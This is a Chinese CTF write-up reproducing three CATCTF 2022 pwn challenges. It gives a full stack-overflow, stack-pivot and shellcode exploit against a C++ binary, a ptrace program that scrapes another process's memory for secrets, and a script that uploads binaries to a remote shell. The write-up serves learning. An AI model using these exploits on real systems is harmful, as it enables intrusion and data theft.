---
title: CATCTF2022_pwn复现
tags:
  - C++
  - 栈溢出
  - 沙箱
  - 栈迁移
  - 进程注入
  - 上传脚本
categories: 赛题WP
abbrlink: 74f96fff
---
## welcome_CAT_CTF

运行程序，发现是一个小游戏，可以上下左右来移动 `@` 这个字符，并且程序运行之初询问了服务器的 IP 和端口。

看伪代码的这里(如下)

![](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301041745431.png)

如果能进入此处的 if ，那么就可以获取到服务器上的 `flag` ，条件有两个，第一个是满足`s[100 * v0 - 100 + v1] == &unk_963B` 这个后面的其实就是字符 `@` 。

而在按下 `w` 键，进行的操作如下

```c
      case 'w':
        if ( (char *)s[100 * v0 - 100 + v1] == " " )
        {
          s[100 * v0-- + v1] = (__int64)" ";
          s[100 * v0 + v1] = (__int64)&unk_963B;
        }
```

按照逻辑可以猜测，按下 `w` 是向上移动，而向上移动的前提肯定是上面的那个内存要是空格，不然当前 `@` 上面有字符是无法向上移动的(可以结合程序运行发现这一点)，所以可以猜测 `s[100 * v0 - 100 + v1]`指向的就是当前字符 ` @` 的上一个格子，因此获取 `flag` 的那个 if 前面的判断就是需要当前 `@` 上面的格子里也是一个 `@`，实现这一点只需要简单的 `adws`来移动即可。

而程序正常运行的话无论如何也无法让 `glod` 这个变量大于 `100000000` ，而获取 `flag` 的方式只要是进入这个 if 判断就可以获取，因此可以使用 `gdb` 中的 `set` 命令修改变量的值，从而绕过检查。

总结一下就是先用 `gdb` 修改 `glod` 这个全局变量大于 `100000000` ，接着让 `@` 移动到 `@`下面，然后按下 `j` (因为获取 `flag` 的那个 if 条件是在 `case: ‘j’` 下面的) 即可获取flag





## bitcoin

这题当时就扫了一眼，一看是 `C++` 的题目直接跑路了，不过比赛完了之后入门了一下 `C++` 所以现在正找 `C++` 的题目练练手呢（ `winmt` 师傅出的那个除外，实在感觉太难辣，如果有可能的话放到最后复现，如果没可能的话就跑路了 QAQ ），这道题其实一点也不难，就是一个常规的栈溢出，不过 `C++` 写的程序，确实跟之前做的常规栈溢出还有一点不太一样。

关于 `C++` 零基础入门，从零到零点一的话，可以看这篇[文章](https://zikh26.github.io/posts/4320fd7a.html)

#### 保护策略

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112149112.png" alt="image-20230111214911908" style="zoom: 67%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112154233.png" alt="image-20230111215447098" style="zoom:50%;" />



#### 漏洞所在：

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112158735.png" alt="image-20230111215853664" style="zoom:50%;" />

因为没有开 `canary` ，因此这里 `std::cin >> v4` 包括往 `v3` 中输入数据都是存在栈溢出的。

所以常规打一个 `ret2libc` 即可，然后程序禁用了 `execve` ，最后去执行 `orw` 



#### 利用思路：

这里要说明一点，本题要再次输入的话，要利用 `cin >>` 来实现，这个东西是需要控制两个参数的，第一个是 `std::cin` 的地址，第二个是写入数据的目标地址。而执行的地方为

![image-20230111224545172](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112245220.png)



有一点像 `scanf` 函数，然后就是先泄露 `libc` 地址，同时控制 `rbp` 的值为接下来的栈迁移做一个准备，再做一个往 `bss` 段上输入的 `rop` ，最后给一个 `leave ; ret` 触发栈迁移。准备往 `bss` 段上写的 `rop` 是在已经有了 `libc` 地址的情况下做的，因此我们可以去调用 `mprotect` 函数将 `bss` 段改为可读可写可执行，后面紧跟着执行 `orw` 的 `shellcode`。

其实泄露的 `libc` 地址就一个用处，就是从 `libc` 中取了一个 `pop rdx ; ret` 这个 `gadget` 

需要注意的是， `orw` 之前必须要先把标准输入给 `close` 掉。也就是先执行 `close(1)` 再 `open` `read` `write`  不然远程打印不出来 `flag`



#### EXP:

```py
from tools import *
context.log_level='debug'
context.arch='amd64'
p,e,libc=load("pwn","61.147.171.105:61597")
pop_rdi=0x0000000000406303
pop_rsi_r15=0x0000000000406301
cin_addr=0x6093A0
use_cin=0x401C30 
bss_addr=0x609530
leave_addr=0x40223A

print(hex(e.got['printf']))
sleep(0.1)
p.send('\n')

payload=b"a"*0x40+p64(bss_addr-8)+p64(0x40223B)+p64(pop_rdi)+p64(e.got['mprotect'])+p64(e.plt['printf'])
payload+=p64(pop_rdi)+p64(cin_addr)+p64(pop_rsi_r15)+p64(bss_addr)+p64(0)+p64(use_cin)+p64(leave_addr)

p.sendlineafter("Name: ",'a')
debug(p,0x4021D8,0x401C30)
p.sendlineafter("Password: ",payload)
sleep(1)
mprotect_addr=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
libc_base=mprotect_addr-libc.symbols['mprotect']
log_addr('mprotect_addr')
log_addr('libc_base')

pop_rdx=libc_base+0x0000000000001b96
sleep(1)
orw=b"\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
payload=p64(pop_rdi)+p64(bss_addr&0xfff000)
payload+=p64(pop_rsi_r15)+p64(0x1000)+p64(0)
payload+=p64(pop_rdx)+p64(7)
payload+=p64(e.plt['mprotect'])
payload+=p64(bss_addr+0x48)
payload+=orw
p.sendline(payload)
p.interactive()
```



![image-20230112004628191](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301120046474.png)





## injection2.0

这种类型的题目是第一次见，跟着官方的 `WP` 复现一下。

### 文件分析

![image-20230113111031792](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301131110883.png)

给的文件是上面这些， `rootfs.img` 文件是一个文件系统映像文件，它是将 `_install` 文件进行了打包。所以这里是用 `qemu` 来模拟的，在 `_install` 文件中 `init` 作为 `qemu` 的初始化脚本。

`init` 文件内容如下

```shell
#!/bin/sh
echo "INIT SCRIPT"
mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t debugfs none /sys/kernel/debug
mount -t tmpfs none /tmp
echo 0 | tee /proc/sys/kernel/yama/ptrace_scope
chown 0:0 flag
chmod 755 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console
echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
./target >pso.file 2>&1 &
setsid /bin/cttyhack setuidgid 0 /bin/sh
#setsid /bin/cttyhack setuidgid 0 /bin/sh # 修改 uid gid 为 0 以提权 /bin/sh 至 root。
poweroff -f # 设置 shell 退出后则关闭机器
```

而关键是在下面三句

```shell
echo 0 | tee /proc/sys/kernel/yama/ptrace_scope
./target >pso.file 2>&1 &
setsid /bin/cttyhack setuidgid 0 /bin/sh
```

第一句是关闭了 `linux` 内核中的 `ptrace` 限制。`ptrace` 是一种 `linux` 内核中的进程调试功能，他可以让一个进程跟踪另一个进程的执行情况，跟踪进程可以访问被跟踪进程的内存空间和寄存器的值。为了防止恶意程序利用 `ptrace` 进行攻击，`Linux` 内核开发者在内核引入了 `yama` 的安全机制，其中的一个子模块 `ptrace_scope` 就是用来限制 `ptrace` 使用的，默认情况下， `yama` 的 `ptrace_scope` 被设置为 `1` ，这意味着只有当父进程和子进程属于同一用户时，才能跟踪子进程，**如果设置为 `0` 就是关闭这个限制，任何进程都可以跟踪其他进程**。

第二句是运行 `target` 程序，并将程序的标准输出和标准错误都重定向到 `pso.file` 文件，并将该进程设置为后台进程。

第三句是脱离原先的终端，并获取 `root` 权限



然后 `target` 文件内容如下

![image-20230113173903535](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301131739623.png)

先将 `flag` 文件读入到栈上，然后 `close` 将三个文件流全部关闭，再将 `flag` 文件删除掉，最后有一个永真循环，不断打印休眠打印字符串（目的是让进程一直处于运行状态，不会结束）



### 利用思路：

因为将 `/proc/sys/kernel/yama/ptrace_scope` 设置为了 `0`,并且权限为 `root` 。因此可以使用 `ptrace` 接口来访问进程的内存。

首先执行命令 `ps -ef` 获取进程的 `PID` ，再用 `/proc/pid/maps` 获取栈地址，因为此时的进程依然在运行，所以 `flag` 依然存在到栈上，调用 `ptrace` 获取栈内数据比对 `flag` ，比对成功的话，就将接下来内存中的数据打印出来，从而获取 `flag` 。

而上面所说的比对并打印 `flag` 需要用C语言的脚本来实现，因为是第一次做这种题目，所以直接把官方的 `WP` 中的 `exp` 贴到这里了（主要感觉这种轮子没必要再去自己写一个，直接用或者根据需求再改改就挺好）

```c
#include <stdio.h>
#include <sys/ptrace.h>
//cat /proc/131/maps
int main(int argv , char **argc){
 
  int data ;
  int stat ;
  int pid = atoi(argc[1]) ;//这里需要手动传入命令行参数 target的pid
  ptrace(PTRACE_ATTACH, pid, NULL, NULL) ;
  wait(&stat) ;    // 如果不wait，马上进行下一个ptrace的PEEK操作会造成 no such process 错误
  long long int addr = 0 ;
  scanf("%llx",&addr);
  for (; addr < 0x7ffffffff000; ++addr)
  {
    data = ptrace(PTRACE_PEEKDATA, pid, addr, NULL);    // 一次读一个字节
    if(data==0x65636165)
    {
      printf("data = %x , addr = %llx\n" , data , addr) ;
      long long int addr1=addr-1;
      char data1;
      for(int i=0;i<100;i++)
      {
        addr1+=1;
        data1 = ptrace(PTRACE_PEEKDATA, pid, addr1, NULL);
        //write(1,data1,0x10);
        printf("%c" , data1) ;
      }
    }
  }
  ptrace(PTRACE_DETACH, pid, NULL, NULL);
  return 1 ;
}
```

但是这个脚本我们是无法在远程的环境上编写并编译的，所以我们得在本地编译好，然后用 `python` 脚本将 `exp` 进行 `base64` 编码，然后上传到远程环境。

`python` 脚本如下：

这个依然是官方的 `python` 脚本。作用就是将 `exp` 上传到远端环境中。

```py
from pwn import *
context(log_level='debug')
#io = process("./boot.sh")
io = remote("61.147.171.105",61265)

def exec_cmd(cmd):
    io.sendline(cmd)
    io.recvuntil("# ")

def upload(exp):
    p = log.progress("exp")
    with open("./"+exp, "rb") as f:
        data = f.read()
    encoded = base64.b64encode(data)
    io.recvuntil("# ")

    for i in range(0, len(encoded), 600):
        p.status("%d / %d" % (i, len(encoded)))
        exec_cmd("echo \"%s\" >> /tmp/benc" % (encoded[i:i+600]))

    exec_cmd("cat /tmp/benc | base64 -d > /tmp/exp")
    exec_cmd("chmod +x /tmp/exp")
upload('exp')
io.interactive()

```

![image-20230113184223347](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301131842540.png)



## 参考文章：

[攻防世界 x Nepnep x CATCTF 2022 Nepnep战队官方WP | xia0ji233's blog](https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#injection2-0💉)
